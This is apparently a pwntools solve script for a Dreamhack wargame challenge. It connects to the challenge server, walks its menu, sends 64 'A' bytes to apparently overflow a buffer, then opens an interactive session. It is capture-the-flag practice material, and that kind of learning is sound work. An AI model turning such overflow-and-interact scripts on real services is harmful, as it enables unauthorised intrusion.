from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20487
r = remote(HOST, PORT)

r.sendlineafter(b': ', b'2')
r.sendlineafter(b': ', b'A'*64)
r.sendlineafter(b': ', b'1')
r.sendlineafter(b': ', b'3')

r.interactive()